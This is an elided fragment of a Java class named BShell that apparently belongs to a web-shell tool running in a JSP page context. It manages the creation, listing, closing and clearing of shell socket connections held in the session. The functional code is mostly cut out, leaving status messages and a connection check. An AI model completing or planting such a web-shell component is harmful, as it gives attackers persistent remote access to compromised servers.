...
public class BShell implements Runnable {
    ...
    public boolean equals(Object obj) {
        ...
        try {
            if (action.equals("create")) {
                createBShell();
                result.put("msg", target + "The BShell was created successfully");
    ...
    private Map<String, String> listBShell(PageContext page) throws Exception {
        ...
        if (this.Session.getAttribute("BShellList") != null) {
            ...
            result.put("status", "fail");
            result.put("msg", "There is no surviving BShell connection");
        }
        return result;
    }
    ...
    private Map<String, String> closeBShell(PageContext page) throws Exception {
        ...
        if (this.Session.getAttribute("BShellList") != null) {
            ...
            if (BShellList.containsKey(target)) {
                ...
                result.put("status", "success");
                result.put("msg", "The BShell connected to [" + target + "] has been closed.");
            } else {
                result.put("status", "fail");
                result.put("msg", "The BShell connected to [" + target + "] was not found.");
            }
    ...
    private Map<String, String> clearBShell(PageContext page) throws Exception {
        ...
        result.put("status", "success");
        result.put("msg", "BShell has been emptied.");
        return result;
    }
    ...
    private String doWork() throws Exception {
        ...
        if (socketChannel == null)
            throw new Exception("The specified BShell does not exist:" + target);
